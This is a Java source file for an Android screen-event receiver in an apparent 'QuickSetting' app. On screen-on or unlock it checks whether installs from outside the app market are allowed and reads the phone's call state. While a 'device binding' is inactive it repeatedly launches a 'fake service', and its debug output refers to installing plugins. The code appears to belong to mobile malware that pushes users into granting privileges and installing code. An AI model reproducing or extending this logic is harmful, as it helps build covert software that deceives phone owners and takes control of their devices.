package com.xstd.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.*;
import com.xstd.qm.service.DemonService;
import com.xstd.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-15
 * Time: PM2:41
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        Config.LOGD("<<<< [[ScreenBroadcastReceiver::onReceive]]" +
                        " Phone Model : " + android.os.Build.MODEL +
                        " >>>>>");

//        if (AppRuntime.isXiaomiDevice()) {
//            if (Config.DEBUG) {
//                Config.LOGD("[[QuickSettingApplication::onCreate]] this device is Xiaomi Devices, just ignore this device");
//            }
//            return;
//        }

        if (intent != null
                && intent.getAction() != null
                && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
                        || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                        || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                SettingManager.getInstance().init(context);
                Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                int open = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0);
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                int l = tm != null ? tm.getCallState() : TelephonyManager.CALL_STATE_IDLE;

                long cur = System.currentTimeMillis();
                if (Config.DEBUG) {
                    Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] check if should install plugin : "
                                    + "\n            lanuch time = " + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLanuchTime())
                                    + "\n            install delay = " + SettingManager.getInstance().getKeyInstallInterval()
                                    + "\n            current time = " + UtilsRuntime.debugFormatTime(cur)
                                    + "\n            open install NO market APP = " + open
                                    + "\n            main Device bind = " + AppRuntime.isBindingActive(context)
                                    + "\n            main Device bind count = " + SettingManager.getInstance().getDeviceBindingActiveTime()
                                    + "\n            Disable Download Plugin = " + SettingManager.getInstance().getDisableDownloadPlugin()
                                    + ")");
                }

                long launchTime = SettingManager.getInstance().getKeyLanuchTime();
                if (launchTime == 0) {
                    //first lanuch

                    if (Config.DEBUG) {
                        Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
                    }

                    Intent i = new Intent();
                    i.setClass(context, DemonService.class);
                    i.setAction(DemonService.ACTION_LANUCH);
                    context.startService(i);
                }

                if (!AppRuntime.isBindingActive(context)
                        && (SettingManager.getInstance().getDeviceBindingActiveTime() < 10)
                        && !SettingManager.getInstance().getDisableDownloadPlugin()) {
                    Utils.startFakeService(context, "[[ScreenON]]");
                    return;
                }
            }
        }
    }

}
